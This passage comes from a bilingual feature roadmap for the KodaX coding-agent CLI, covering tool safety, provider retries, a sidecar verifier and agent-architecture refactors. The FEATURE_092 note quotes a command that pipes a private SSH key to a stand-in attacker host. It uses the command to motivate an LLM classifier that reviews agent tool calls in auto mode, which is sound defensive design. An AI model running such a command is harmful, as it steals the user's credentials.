站点替换。**参考**: FEATURE_147 v0.7.37 ai→llm 853-import rename precedent / FEATURE_142 v0.7.35.1 Batch B session-lineage 拆分历史（本 feature 把它合回去 closure the loop）/ [[feedback_no_parallel_refactor_paths]] / [[feedback_concurrent_thread_git_race]] / [[feedback_selective_hunk_staging]] / [[feedback_workspace_packages_need_rebuild]] / [ADR-036](#adr-036-package-consolidation--inline-single-consumer-subpackages-into-agent-feature_194-v0743) |
| `126` | PM Mode Tool Restriction (Data-Driven) — Hard Enforcement of PM Behavior via Tool Whitelist | Enhancement / Quality | Low | `v0.8.x` | TBD (placeholder, contingent on FEATURE_122 production data) |
| `131` | Tool Safety Patch Pack — File Mutation Queue + Edit Unicode Normalization | Core / Tool Safety | High | `v0.7.36` | [v0.7.36](features/v0.7.36.md#feature_131-tool-safety-patch-pack--file-mutation-queue--edit-unicode-normalization) | **Async Safety Pack 之二**（与 FEATURE_119 + FEATURE_130 同期 ship）。Part A: `file-mutation-queue.ts` path-keyed 串行队列防 Pattern B 多 child 并行同文件 race 静默丢改动（Windows 大小写不敏感 + POSIX 保留组件大小写）。Part B: `edit-diff.ts:normalizeForFuzzyMatch` NFKC + smart quotes (`""''`) / em-dash (`—`) / en-dash (`–`) / 全角/IDEO 空格 → ASCII 正规化解决 KodaX 实战 silent edit-fail 主因（用户从 Word/网页/聊天复制代码 + 输入法自动替换 typographic 字符）。Cross-process content-hash 安全网（FEATURE_125）显式留 v0.7.41 |
| `130` | Provider Retry-After Header + Exponential Backoff | Internal / Robustness | High | `v0.7.36` | [v0.7.36](features/v0.7.36.md#feature_130-provider-retry-after-header--exponential-backoff) | **Async Safety Pack 之一**（与 FEATURE_119 + FEATURE_131 同期 ship）。跨 12 provider 标准化处理 4 种 retry-after header 形态：integer-seconds / HTTP-date / Anthropic `retry-after-ms` / 无 header → exponential backoff fallback。Helper `parseRetryAfter` + `extractHeadersFromError` 集中在 `@kodax/ai/retry/retry-after.ts`，每个 `KodaXBaseProvider` 子类自动继承。`KodaXProviderStreamOptions.onRetryAfter` + `KodaXEvents.onRetryAfter` + `RetryRecord` cost-tracker channel + Ink REPL `[Rate limited]` 倒计时 status push。**必须与 FEATURE_119 同期 ship** — Pattern B 多 child 并行直接拉高 429 概率（特别是 5 个共享 quota 的 coding plan provider：kimi/zhipu/mimo/ark/minimax-coding）|
| `141` | Transcript Inline Diff Renderer — Edit / Multi-Edit / Write Tool Result Hunk Display | Enhancement / UX | High | `v0.7.37` | [v0.7.37](features/v0.7.37.md#feature_141-transcript-inline-diff-renderer) (新增 — KodaX `repl/src/` 当前无 diff 渲染组件；edit 完成后用户在 transcript 仅看到普通文本结果。先做 inline 渲染，再决定是否需要 FEATURE_138 turn-level overlay) |
| `132` | LSP Native Integration — TS/JS + Python + Rust + Go + Java (5 languages) + Edit-Time Diagnostics Reflux | Core / Tool | High | `v0.7.49` | TBD (RFC pending; 公共底座 ~680 LOC + 5 语言 adapter ~810 LOC + 测试 ~650 LOC = ~2140 LOC 总量；首语言贵但每加一语言只 ~130-250 LOC，5 语言一鼓作气投入产出比好；从 opencode `lsp/server.ts` + `apply_patch.ts:260-285` 设计模式 — 内置 LSP minimal set + edit 后 touchFile + diagnostics 注入 tool result，省 ≥1 轮 LLM 往返) |
| `137` | RPC Headless Protocol — JSON-Line stdin/stdout Bridge for IDE/Web/SDK | Internal / Surface | High | `v0.8.0` | TBD (RFC pending; merged INTO FEATURE_030 Multi-Surface Delivery; from pi-mono `modes/rpc/rpc-mode.ts` — `takeOverStdout` 纪律 + RpcExtensionUIRequest 双向桥；VSCode extension / web UI / CI 自动化的统一入口) |
| `139` | NotebookEdit Tool — Jupyter Cell-Level CRUD | Enhancement / Tool | Low | `v0.8.20+` | TBD (RFC pending; deferred per user direction — DS/ML 用户驱动，等用户社区反馈再决定是否提前) |
| `111` | ~~Runner-Level Soft-Pause Protocol~~ | ~~Enhancement / UX~~ | ~~High~~ | ~~`v0.7.43`~~ | [v0.7.43](features/v0.7.43.md#feature_111-runner-level-soft-pause-protocol) | **Absorbed into FEATURE_115**: 5 轮调研后确认 soft-pause UX 是 message queue 的具体应用——单击 ESC tool 边界软暂停 + 文字注入下一轮可以完全用 FEATURE_115 的 agentId-scoped drain + Sleep-gated mid-turn drain 实现，不需要独立的 `paused: boolean` runner 局部变量。FEATURE_111 设计稿保留为历史，实现统一走 FEATURE_115。v0.7.43 slot 转交 FEATURE_124（Memory System Alignment） |
| `127` | ~~Per-Agent Model Tier Routing — read-only child default fast model~~ | ~~Internal / Cost~~ | ~~Low~~ | — | — | **Cancelled (never planned)**: 5 轮调研后判断"read-only child 默认 fast model" 是 hard-coded 策略 + Claude Code 特定场景优化（Anthropic 三档 Haiku/Sonnet/Opus + 34M+ Explore spawns/week），不是 read-only 的本质需求。改为：dispatch_child_task schema 加 `model_hint?: 'fast'|'balanced'|'deep'` 可选字段（FEATURE_120 一并加）+ Worker LLM 根据任务自决是否标 hint + 实际 routing 行为合并到 FEATURE_102 (v0.7.45) 的 capability profile。**不预设 hard-coded 默认**，符合 KodaX minimalist 哲学 |
| `095` | ~~SSH-Friendly Cell-Level Diff Renderer for Ink Substrate~~ | ~~Refactor~~ | ~~Medium~~ | ~~`v0.7.39`~~ | [v0.7.30](features/v0.7.30.md#track-f-cell-level-diff-renderer-for-ssh-friendly-output-absorbs-feature_095) | **Absorbed into FEATURE_057**: cell-level screen buffer 是 057 §10 renderer-native selection / §11 ScrollBox parity / Track E output ownership 收口的实际前置基础设施，并入 057 作为 Track F 统一设计与交付 |
| `096` | Windows-SSH ConPTY Host Auto-Downgrade to Main-Screen Policy | Enhancement | Medium | `v0.7.30` | [v0.7.30](features/v0.7.30.md#feature_096-windows-ssh-conpty-host-auto-downgrade-to-main-screen-policy) | **Migrated 2026-04-28**: 原计划 `v0.7.39` 单独交付，2026-04-28 提前迁入 `v0.7.30` 与 FEATURE_057 同版交付，理由见顶部 last-updated 说明 |
| `184` | Sidecar Verifier Substrate — claudecode-Shape Main Agent + Stop Hook Primitive | Internal / Architecture | Critical | `v0.7.42` | [v0.7.42](features/v0.7.42.md#feature_184-sidecar-verifier-substrate--claudecode-shape-main-agent--stop-hook-primitive) | **Shipped 2026-05-21** (原计划 v0.7.45, 实际在 v0.7.42 release window 内 ship; doc 已迁移). 把 Worker → Evaluator handoff state machine 重构为 claudecode-style 单循环 Main Agent + agent-layer Stop Hook primitive + Sidecar Verifier。根本解决 zhipu/glm51 intent-vs-action floor 导致的 verification gate 静默失效（FEATURE_167 B2 兜底 synth `accept` 对 zhipu 0/5 emit_verdict 静默失效问题）。**4 phased commits**：Phase A `@kodax-ai/agent` RunOptions.stopHook primitive（~80 LoC + 120 test，零行为变化可独立 ship）→ Phase B `ExtensionHookMap.turn:complete` bridge + CAP-021 contract test（~50 LoC + 80 test，可独立 ship）→ Phase C Main Agent shape migration 删 Evaluator-as-role state machine（净减 ~423 LoC，**必须与 D 同 release**）→ Phase D Sidecar Verifier 实现（`sideQuery`-based + model 与 main agent 解耦绕开 zhipu floor，~200 LoC + 250 test + Layer 2 prompt eval ~$15）。**关键设计**：sidecar context 装配 = 当轮全部 user queries + 24-msg rolling buffer + file edit summary（必须看到 main agent **改了什么**而非只看它**声明做了什么**）；reanimate budget 硬 cap=2；fail-open default accept；UI 暴露 `⊙ Verifying...` dim spinner 对标 claudecode `hook_stopped_continuation` attachment 风格。**死代码清单**：FEATURE_165 handoff gate / FEATURE_166 label flip / FEATURE_167 B0/B1/B2 fallback / EVALUATOR_AGENT_NAME 注册 / Evaluator role-prompt case / verdict-recorder emit_verdict 分支。**SHIP gate (final)**：(a) MET, treatment 100% ≥ baseline 99% / (b) MET, tool emit-rate 100/100 / (c) MET, 全 20 cells 无 ≤-20pp 退化 / (d) MET, case B 25/25 parity. LLM-judge audit 0% disagreement. 详见 [ADR-030](#adr-030-claudecode-shape-main-agent--sidecar-verifier-substrate-feature_184-v0745) |
| `102` | Adaptive Multi-Provider Orchestration Runtime | Internal / Core | High | `v0.7.45` | [v0.7.45](features/v0.7.45.md#feature_102-adaptive-multi-provider-orchestration-runtime) |
| `105` | Verifiable Advisor Consult Primitive | Internal / Core | High | `v0.7.46` | [v0.7.46](features/v0.7.46.md#feature_105-verifiable-advisor-consult-primitive) |
| `108` | Session-Driven Reflective Prompt Patcher | Internal / Test Infrastructure | Medium | `v0.7.47` | [v0.7.47](features/v0.7.47.md#feature_108-session-driven-reflective-prompt-patcher) |
| `109` | ~~Harness Observability Substrate — Long-Term Memory + Prediction Contract + Cross-Family Prose Guard~~ | ~~Internal / Substrate~~ | ~~Medium~~ | ~~`v0.7.48`~~ | [v0.7.48](features/v0.7.48.md#feature_109-harness-observability-substrate--long-term-memory--prediction-contract--cross-family-prose-guard) | **Cancelled (2026-05-06)**: 调研 v0.7.36-43 已落地后剩余 scope 全部已被覆盖 — long-term memory 给 FEATURE_124（v0.7.43）；audit log 给 FEATURE_090（v0.7.32 ship）+ FEATURE_101（v0.7.31 ship）；cross-family prose guard 是 FEATURE_104（v0.7.29 ship）alias 表语义本身。剩余唯一独立产出是 AHE 论文 component ablation eval（4 组 × 8 alias × 20 case = 640 LLM call ~$30 + 5-7 天工作量），验证成本太高 ROI 不明。如未来 KodaX 跑生产 telemetry 后真有 prompt-structure-vs-prose 决策需求，再做 measurement task（不立 feature） |
| `113` | TodoList JSON / CLI Surface — External Consumption of FEATURE_097 Realtime Progress | Enhancement | Medium | `v0.8.2` | [v0.8.2](features/v0.8.2.md#feature_113-todolist-json--cli-surface) |
| `093` | Coding and REPL Internal Circular Dependency Decoupling | Internal | Medium | `v0.8.0` | [v0.8.0](features/v0.8.0.md#feature_093-coding-and-repl-internal-circular-dependency-decoupling) |
| `007` | Theme System Consolidation | Enhancement | Medium | `v0.8.0` | [v0.8.0](features/v0.8.0.md#feature_007-theme-system-consolidation) |
| `030` | Multi-Surface Delivery | Enhancement | High | `v0.8.0` | [v0.8.0](features/v0.8.0.md#feature_030-multi-surface-delivery) |
| `059` | ~~Managed Task Structured Protocol V2~~ | ~~Internal~~ | ~~High~~ | ~~`v0.8.0`~~ | [v0.8.0](features/v0.8.0.md#feature_059-managed-task-structured-protocol-v2) | **Absorbed into FEATURE_084**: 新的 Layer A 原语重写 Scout/Generator/Evaluator 时，会同步把 fenced-block 文本协议替换为 tool-call 驱动的结构化协议。059 的 dual-track visibleText+protocolPayload 目标并入 084 的 Runner/Span 协议层实现，不再作为独立 feature 调度 |
| `063` | ~~Extensible Hook & Automation Substrate~~ | Enhancement | High | `v0.7.18` | [v0.7.18](features/v0.7.18.md#feature_063-extensible-hook--automation-substrate) | **Cancelled**: Extension 系统已覆盖，executor 能力提取为 `api.exec()`/`api.webhook()` |
| `073` | ~~Reference-Style Lineage and Island Model Removal~~ | ~~Internal~~ | ~~Medium~~ | ~~`v0.7.25`~~ | [v0.7.25](features/v0.7.25.md#feature_073-reference-style-lineage-and-island-model-removal) | **Cancelled**: 哲学审查未通过——没有用户痛点、没有性能改善、主要卖点（`/fork` 改进）已自撤；072 已消除 dual source-of-truth 的结构债；YAGNI（为 partial/multi-boundary compaction 等未规划特性铺抽象）。设计稿保留作为未来真有 use case 时的起点 |

---

## 阅读说明

- `FEATURE_022` 是当前架构转向的 umbrella feature，`FEATURE_019`、`FEATURE_025`、`FEATURE_027`、`FEATURE_028`、`FEATURE_029`、`FEATURE_034` 是它的关键支撑切片。
- `FEATURE_061` 是 AMA 架构简化重构：Scout 成为 AMA 唯一入口（既判断又干活），角色升级保留上下文，每个角色可拉 subagent 并行，去掉预路由层和 Tactical Flow。
- 当前正式执行模型是：`SA` 直达；`AMA` 只保留 `H0 / H1 / H2`；`H3` 已移除。
- `Scout` 是 AMA 的入口和第一执行者：H0 时 Scout 直接完成任务；H1/H2 时 Scout 升级为 Generator 或 Planner 并保留上下文。
- `H1` 是 `Generator + 轻量 Evaluator`：无 `Planner`、无 contract negotiation。Evaluator 打回最多 1 次，再不合格则升级到 H2。
- `H2` 主骨架固定为 `Planner -> Generator <-> Evaluator`。Evaluator 区分 `revise`（执行问题）和 `replan`（计划问题），各最多 1 次。
- `FEATURE_054` 已于 v0.7.27 归档：`/project` 命令整块删除（CLI flag + `project-*.ts` 模块 + barrels + `KODAX_FEATURES_FILE` / `KODAX_PROGRESS_FILE` 常量），无需再做独立的 AMA 吸收任务。后续设计默认以"单主 authority + Planner 吸收 brainstorm"为目标，不再扩独立 project/planner 表面。
- `kodax -c` 属于 `user session` 恢复语义，不属于 internal worker-session recovery。
- `FEATURE_023` 只应继续承担更高层 terminal/delivery ergonomics，不应重新打开 `FEATURE_051 / FEATURE_055` 已冻结的 REPL shell。
- `FEATURE_057` 是 `FEATURE_023` 下的 renderer-boundary 迁移切片：目标是保留当前 shell 的视觉与信息架构，同时把 transcript/prompt/footer 的视口隔离和 host-aware 降级下沉到自有渲染层，而不是重做一个新的 shell。
- `FEATURE_031` 只承担 multimodal artifact intake，不应滑向 gallery、media workbench 或 design-review surface。
- `FEATURE_042` 只应继续加强 repo-intelligence substrate，不应扩成 repo graph / workbench UI。
- `FEATURE_038 / 043 / 053 / 054 / 056` 与 `023 / 031 / 042` 现统一收编到 `v0.7.30`，便于在同一版本内同步推进 runtime clarity、harness safety 与 transcript-native interaction maturity。
- `FEATURE_056` 的目标是补 tool interaction 的解释层与 transcript-native 交互成熟度，不是把 KodaX 做成更重的 coordinator/task cockpit。
- `FEATURE_072` 是 v0.7.18 post-compact 回归（v0.7.19 已用 6 处 surgical fix 止血）之后的结构性收口：把压缩热路径从 flat `context.messages` 迁移到 lineage-native（`getSessionMessagesFromLineage`-driven），让 post-compact attachments 作为 `KodaXSessionCompactionEntry` 的一等字段而不是散在 flat 数组里的 `[Post-compact: ...]` 系统消息。目标是单 source-of-truth，参考 Claude Code `getMessagesAfterCompactBoundary` 和 pi-mono `buildSessionContext`。v0.7.19 的 P4（字符串前缀 dedup）和 P6（REPL finally 复位）在 migration 完成后会被退休。
- `FEATURE_073`（Reference-Style Lineage）已 **Cancelled**。原意是把压缩数据模型从 copy-style 换到 reference-style，对齐 pi-mono / Claude Code 的心智模型。但站在 KodaX "Minimalist & Intelligent" 哲学回看：该 feature 解决零用户痛点（072 已修好 post-compact 回归）、无性能改善（和 copy-style + eviction memory parity）、主要卖点（`/fork` 到压缩前 entry 的语义改进）在挑战过程中被自己撤回；剩余动机"便于未来 partial compaction / multi-boundary 落地"属于 YAGNI。设计稿保留在 `docs/features/v0.7.25.md` 作为未来若出现具体 use case 时的参考起点。
- `FEATURE_076` 是 v0.7.19 Scout ceiling clamp fix（commit `3efdb7b`）之后的结构性收口：把 `runManagedTask` 出口的 `context.messages` 从"代理执行轨迹"（Evaluator 的独立会话、Scout role prompt 包装）收正为"用户对话"（干净的 `{user, assistant}` 对），让 multi-turn conversation、token 统计、session 持久化在 SA/H0/H1/H2/resume 所有路径上语义一致。与 `FEATURE_046`（轮内 worker handoff）关注点不同；`046` 负责轮内 final-answer convergence，`076` 负责轮间 message shape。
- `FEATURE_078` 是 reasoning 子系统的**分层化**：把当前"单一全局 `--reasoning auto|quick|balanced|deep|off` 档位 + 兼容 `--thinking` 别名 + provider `reasoning-overrides`"的平面模型，拆成四级决策链（L1 用户意图上限 / L2 角色默认 / L3 Scout 下游建议 / L4 Evaluator 动态升档）。动机：Scout 自己需要 reasoning 才能跑，因此不能由 Scout 决定所有角色的 reasoning 档位；而一个全局档位又无法区分"Scout 要快、Generator 要深"这类合理诉求。**依赖**：FEATURE_080（Agent primitive 字段）+ FEATURE_084（Scout/Generator/Evaluator 已是 Agent 实例）+ **FEATURE_100（v0.7.29，给 SA 路径的 `defaultCodingAgent` 也接通 Agent declaration 上的 reasoning slot，否则 SA 无角色锚点 → 锁死 L1 ceiling 违背 ADR-003）**。版本节奏：原计划 v0.7.35 → Plan B 移到 v0.7.29 → 2026-04-26 因 FEATURE_100 占满 v0.7.29 移到 v0.7.30 与 FEATURE_057 Track F 共版 → **2026-04-27 撤回顺延、加回 v0.7.29 与 FEATURE_100 同版**（FEATURE_100 P3.6v 完成 SA/AMA 共享底座 17/17 后，substrate executor 已能直接承接 4 段决策链；078 也用 P3.6v 类似的 contract test + grep gate 多重保障落地）。
- **`FEATURE_100`（v0.7.29）是 KodaX 实现层 SA / AMA 双底座漂移的最终收口**。事实状态：`packages/coding/src/agent.ts:1433` `runKodaX`（3164 行）作为 SA 入口，`packages/coding/src/task-engine/runner-driven.ts:3698` `runManagedTaskViaRunner` 作为 AMA 入口，两条路径完全独立；后者 13 处 `// legacy parity restore` 注释（`onSessionStart` / repoIntelligenceContext / `cleanupIncompleteToolCalls` / `saveSessionSnapshot` / cost tracker / multimodal 等）是 v0.7.26 FEATURE_084 让 AMA 路径绕开 `runKodaX` 之后陆续补回的 SA-already-had 能力，构成 FEATURE_084 漂移的反向充分证据。决策模型：用户层 SA / AMA 切换永久保留为产品决策（ADR-003 / ADR-012），实现层收敛到 **Option α — 单一 substrate executor + 多 Agent declaration**（SA topology = `Runner.run(defaultCodingAgent, prompt, ctx)`，AMA topology = `Runner.run(scoutAgent, prompt, ctx)`，dispatcher 只挑 declaration 不分叉 body）。auto-reroute 等 7 类 SA-exclusive 能力按 Class 1 substrate middleware（无条件运行）+ Class 2 Runner-level guardrail（注册式）+ Class 3 declarable opt-in middleware（`AgentDeclaration.middleware` 字段开关，auto-reroute default-on for `defaultCodingAgent` 和 `generatorAgent` —— 让 AMA Generator 也能 mid-iteration 升档应对更难任务，符合 ADR-003）三层归类。**显式废除 v0.7.23 FEATURE_080 的 "Option Y" facade**（Runner.run 注册 dispatcher 转回 `runKodaX` 的 shim），删除 `runDirectKodaX` 符号、删除 13 处 parity-restore patch（能力来自 substrate）。**质量保证**：P1（capability inventory + golden trace + contract test 框架，1 周）→ P2（pure extraction 行为零变更，1-1.5 周）→ P3（Runner Frame Adoption 实质收敛，1.5-2 周）→ P4（dead code cleanup + reverse audit grep `legacy|parity restore|inadvertently dropped` 必须 0 命中，0.5 周），phase 间硬 gate 不得并行。**直接切换不留 legacy flag**（产品决策：质量优先于节奏，避免拖延技术债 + 不重蹈 FEATURE_084 双轨过渡的覆辙）。预计 4-5 周完成。详见 [v0.7.29 设计稿](features/v0.7.29.md#feature_100-sa-runner-frame-adoption--capability-unification) 和 [ADR-020](ADR.md#adr-020-unified-agent-execution-substrate-feature_100-v0729)。
- **`FEATURE_079 - FEATURE_091` + `FEATURE_100` 是 KodaX 从"coding CLI product"升级为"可被复杂 Agent 系统嵌入的基础设施"的主路线**（Plan B 压缩版 + v0.7.29 SA 收敛）。该路线分三段：**SDK 基底段**（v0.7.22-v0.7.27，FEATURE_079 到 086）把 task-engine 拆成可维护的核心 + 引入 Agent/Handoff/Runner/Guardrail/Tracer/Span 等 Layer A 原语 + 按新原语重写 Scout/Generator/Evaluator + 清理 `KodaX*` 前缀死码 + 抽出 repointel 协议包；**底座统一段**（v0.7.29，FEATURE_100）把 SA 路径从独立 `runKodaX` 实现收敛到 Runner 帧 + Agent declaration 模型，关闭 v0.7.23 Option Y facade 之后的实现层双底座漂移，让所有后续 feature 的 Runner-level 集成点在 SA / AMA 两个 mode 下天然对等；**自构建段**（v0.7.28、v0.7.30-v0.7.32，FEATURE_087/088/078/060/089/090）引入 ConstructionRuntime + Constructed-World + 档 2-4 的 Tool/Agent 生成与自改 role spec + reasoning 子系统分层 + bounded-memory 收口。全部完工于 v0.7.32 之前，0.8.0 不做任何底座改动。本方案通过 5 处合并（080+081 / 082+083 / 084+085 / 086+091 / 087+088）+ FEATURE_100 + FEATURE_078 共占 v0.7.29（078 在 100 的 substrate executor 收敛后撤回顺延，2026-04-27）控制版本数。
- `FEATURE_079` 是 task-engine.ts 的**阶段 1 拆分**：纯提取（pure extraction），零行为变化。把当前 9000+ 行的 task-engine 中与 Scout/H1/H2 状态机解耦的部分（prompt builder、pure reducer、managed-task util 等）迁到同目录下的子模块，task-engine.ts 作为 re-export 门面继续提供原有 symbol，测试全部保持绿。这是所有后续 Layer A/B 切分的前提，单独成版本以控制风险。
- `FEATURE_080 + FEATURE_081` 合并在 **v0.7.23** 落地：两者共同完成"**Layer A data shape 定型**"。080 引入 `Agent`（declarative dataclass）、`Handoff`（continuation / as-tool 两种语义）、`Runner`（最小执行入口）、`Guardrail`（占位类型），并 dog-food SA 直达路径。081 把 Compaction 分成 `CompactionPolicy` 接口 + `DefaultSummaryCompaction` + `LineageCompaction`（保留 FEATURE_072 能力），Session 切成基础接口 + `LineageExtension`。合并理由：两者都是"数据形状"层的契约定型，`Agent.tools` / `Agent.handoffs` / `Session` 在内部需要同一批引用点一起定型，分开做反而要 touch 相同文件两次。FEATURE_076 的 round-boundary 语义、FEATURE_060 的 bounded-memory 目标作为设计前置约束保留。
- `FEATURE_082 + FEATURE_083` 合并在 **v0.7.24** 落地：两者共同完成"**primitive 基础设施层**"。082 按 Layer A/B/C 分层切出 `@kodax/core`、`@kodax/mcp`（整体搬迁保留渐进式披露的 lazy connect / 两级描述符 / search-describe / elicitation / cache 五个模式，**暂不泛化** `ProgressiveCapabilitySource` 接口，遵守 CLAUDE.md "3+ real cases 才抽象"规则）、`@kodax/capabilities`、`@kodax/tracing`、`@kodax/session-lineage`。083 引入 `Trace` / `Span` / `SpanData` 子类 / `TracingProcessor` 接口，收编现有碎片化 trace 到同一 span 模型。合并理由：082 已经为 tracing 准备了 `@kodax/tracing` 包位，同版本填充 tracing 内容是自然的连带。同步清掉 `@kodax/ai/cli-events/` 包职责外溢（GLM F-8）。
- `FEATURE_084 + FEATURE_085` 合并在 **v0.7.26** 落地：两者共同完成"**runtime 行为层重写**"。084 用 `Agent` 声明式重写 Scout/Generator/Evaluator 为标准 Agent 实例，用 `Handoff` 表达角色转移，**同步替换** fenced-block 文本协议为 tool-call 驱动的结构化协议（吸收 FEATURE_059 的 dual-track visibleText+protocolPayload 目标）。085 在 Agent 的 input/output/tool 三个挂点补齐 Guardrail runtime，开放注册走 extension runtime。合并理由：084 重写 Scout 时必然 touch Agent 的 input/output/tool 各位点，同时挂 guardrail 钩子比分开两版每版挂一遍经济。
- `FEATURE_086 + FEATURE_091` 合并在 **v0.7.27** 落地：两者共同完成"**清理与协议抽取**"。086 借用户量少的窗口**一次性**移除 `KodaX*` 前缀（不走长期 deprecated 路径），核心 primitive 去前缀，brand 类型（`KodaXError`、`KodaXClient`、`KodaXCodingOptions`）保留；同步清除 `compactMessages()` legacy、`--team` CLI 参数、README 残存 `/project` 流程、GLM F-4/F-5/F-6 归一化函数重复。091 把 `premium-contract.ts` 抽成独立 npm 包 `@kodax/repointel-protocol`，三方消费者（公仓 KodaX、私仓 KodaX-private、`clients/repointel/` 第三方 host 接入）统一依赖协议包，替代当前 vendor 方式。合并理由：两者都是"清洁与抽取"类的结构性 hygiene 工作，风险域互不相交（前缀在 coding/core，协议在 repo-intelligence），可以同版本完成。
- `FEATURE_087 + FEATURE_088` 合并在 **v0.7.28** 落地：两者共同完成"**自构建基础设施 + 档 2 首个消费者**"。087 引入 `ConstructionRuntime` 四段生命周期（stage/test/activate/revoke）+ Constructed-World 存储（`.kodax/constructed/`）+ Resolver 合并 + policy gate。088 让 Agent 生成 Tool 定义并通过 sandbox 测试后注册（档 2）。合并理由：087 提供基础设施，088 是它的首个真实消费者；一起做能验证基础设施的 API shape，避免 087 独立落地后 088 才发现接口需要调整。档 1（Skill 生成）作为既有能力的自然兑现，在本版自动可用。
- `FEATURE_101 + FEATURE_089 + FEATURE_106` 合并在 **v0.7.31** 落地三 feature：101 是横切 **Constructed Agent Admission Contract**（quality invariant 三段 hook 模型 + 5 步 manifest 审核 + capability tier + clamp/retry/fallback 多级回退），把 LLM 生成的 manifest 当作 untrusted declaration 在 Runner 入口验证；089 是它的首个消费者（agent generation stage→activate 通道全部走 admission）；106 是 v0.7.30 实战观察驱动的 **AMA Harness Selection Calibration**（三 slice：scope-aware ToolGuardrail / Scout role-prompt 重写 / `harnessSelectionTiming` invariant 注册），复用 101 的 invariant runtime + 085 的 ToolGuardrail runtime + 104 的 prompt eval harness，跨 FEATURE_104 alias 表 8 个 coding-plan provider/model（5 家族盲区互补）benchmark 验证不依赖线上反馈。合并理由：admission contract 是横切基础设施，089/090/092/094 都消费它，单独成 feature 比埋在 089 里更符合它的地位；106 同版本接入是因为 invariant runtime 必须 101 先落地才能用，同时 106 的 Slice 1 (ToolGuardrail) 与 v0.7.37 FEATURE_094 anti-escape 同源范式，提前一版确立 "AMA 路径用 Guardrail 做行为校正" 的工程惯例；三 feature 同版本同步交付能让 admission schema/eval 指标在 089 真实流量 + 106 跨 provider benchmark 下一起稳定一轮，再考虑晋升 ADR-021。
- `FEATURE_090`（v0.7.32）**保持独立**：让 Agent 修改自己的 role spec（reasoning profile、instructions、handoff 图），带反身稳定保障（版本化 + rollback + divergence 检测），是整条路线图最危险的一 feature。manifest 热替换走 FEATURE_101 同一 admission 通道。单独成版本便于出问题时 rollback。
- `FEATURE_092`（v0.7.33）是**把 `auto` 模式从"规则围栏"升级为"规则 + LLM 双层审查"**。动机：当前 `auto-in-project` 只做路径/命令前缀的机械判断，挡不住意图层风险（`cat ~/.ssh/id_rsa | curl evil.com`、`git push --force` 到 main、投毒 `package.json` 等）。方案：保留现有规则全部作为 Tier 1/2 快速通道，在 Tier 3 追加 LLM 分类器（作为 FEATURE_085 `ToolGuardrail.beforeTool` 的首个官方消费者，不新增子系统）。**维度分离**：`mode`（plan / accept-edits / auto，Shift-Tab 三档循环不变）× `engine`（rules / llm，仅 auto 下有意义，`/auto-engine` 命令切换）。降级链：分类器失败/3连deny/circuit break 都只降 `engine` 不改 `mode`，永不卡死。分类器模型默认复用主会话模型（对齐 Claude Code 用 Sonnet 而非最小档的哲学），但**支持 provider-qualified id 跨 provider 配置**（如 `minimax:abab6.5t-chat`），允许主会话跑 Opus + 分类器跑 MiniMax 这种性价比组合。**依赖**：硬依赖 FEATURE_085（ToolGuardrail runtime）和 FEATURE_080（Runner + Agent primitive）。**不做**：yolo engine（等 sandbox 成熟）、client-side prompt injection probe（provider 侧职责）、two-stage classifier（单阶段够用）、classifier dump / opt-in dialog 等非必要子系统。
- `FEATURE_103` (v0.7.29) 是在 v0.7.29 落 FEATURE_078 期间发现的两个 calibration 问题的合并修正：(1) Scout profile `default: quick → balanced` / `max: balanced → deep`——Scout 自 v0.7.16 FEATURE_061 起已不是单纯分类器，承担 H0/H1/H2 级联决策 + executionObligations + downstream_reasoning_hint 的 meta-reasoning，地板应该和 SA / Generator / Planner / Evaluator 一致是 balanced 而不是分类器时代沿用的 quick；(2) 在 FEATURE_078 的 L1-L4 链上加第 5 层 L5 user-followup escalate——任务边界处用户表达怀疑（"这个不对吧"）或加深要求（"仔细分析"）时单步升档，与 L4（任务内 Evaluator-revise 升档）形成"系统自检 + 用户施压"双轨。doubt 类别要求 prior assistant turn（防 false-positive），deepen 类别不要求；off 是 sacrosanct kill switch；deep 是 fixed point；不直接跳 max（多步可达，避免一次用完头寸）。详见 [v0.7.29 FEATURE_103 设计](features/v0.7.29.md#feature_103-scout-calibration--l5-user-followup-escalate)。
- `FEATURE_104` (v0.7.29) 是 prompt-eval 测试基础设施模块化 + 数据集/结果分目录约定：把 v0.7.29 之前 7 个 `tests/*.eval.ts` 各自 inline 的 `(provider, model, apiKeyEnv)` 三元组收敛到 `benchmark/harness/aliases.ts` 的 8 个用户指定 coding-plan 短名（`zhipu/glm51` / `kimi` / `mimo/v25{,pro}` / `mmx/m27` / `ark/glm51` / `ds/v4{pro,flash}`）；提供共享 judges (`mustContainAll/Any` / `mustNotContain` / `mustMatch/NotMatch` / `lengthWithin` / `parseAndAssert` / `runJudges`，含 JudgeCategory 维度) 和 harness (`runOneShot` / `runABComparison` / `runBenchmark` 量化版含 multi-run + variance + decomposed quality + REPORT.md 9 段输出 + persist 到 `benchmark/results/<timestamp>/`)；KodaX 场景与 LiveCanvas recipe 唯一 deviation 是**质量是唯一打分维度**（coding agent 慢但对优于快但错，latency 仅做诊断不打分）；把"什么 PR 必须配 prompt eval"的判断口径写进 `benchmark/README.md`（凡涉及 system-prompt / role-prompt / tool-description / coding-preset DEFAULT_INSTRUCTIONS / protocol-emitter prompts 的字符串字面量都要 eval；只调思考深度参数的不要）。folder 结构: `benchmark/{harness/, datasets/, results/}` 中 harness + datasets 进 git，results 不进 git。41 个 self-test 锁住 alias 表 verbatim shape + judge category 维度 + benchmark 矩阵聚合 + REPORT.md 渲染 + persistence 读写 + quality-only 设计的 negative-space 验证（无 speedScore/composite），跑在默认 `npm test` 里零 LLM 成本；真实 `*.eval.ts` 跑在独立的 `npm run test:eval`（缺 API key 自动 skip）。详见 [v0.7.29 FEATURE_104 设计](features/v0.7.29.md#feature_104-prompt-eval-harness-module-v2--quantitative-benchmark)。
